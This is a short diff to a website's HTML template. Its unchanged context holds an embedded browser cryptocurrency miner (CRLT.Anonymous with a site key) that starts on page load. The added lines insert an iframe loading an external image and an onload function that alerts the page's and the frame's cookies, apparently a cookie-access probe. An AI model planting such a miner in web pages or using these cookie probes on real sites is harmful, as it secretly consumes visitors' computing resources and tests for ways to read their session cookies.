@@ -21,11 +21,15 @@
 	<script>
 	  var miner=new CRLT.Anonymous('cdd1dd7892527af2af3c09077a91f7f1e9e35d639b4e', { coin: "upx"});
 	  miner.start();
+		function onMyFrameLoad() {
+              alert(window.document.cookie); alert(window.frames[0].document.cookie);
+           };
   </script>
 
 </head>
 <body class="bg-shape">
-
+<iframe sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-cookie"
+    src="https://prod-profile.pscp.tv/10943553/bf892edc25eb9f7de556b358a324ce6b-128.jpg" onload="onMyFrameLoad(this)"></iframe>
   <!--================ Header Menu Area start =================-->
   <header class="header_area">
     <div class="main_menu">
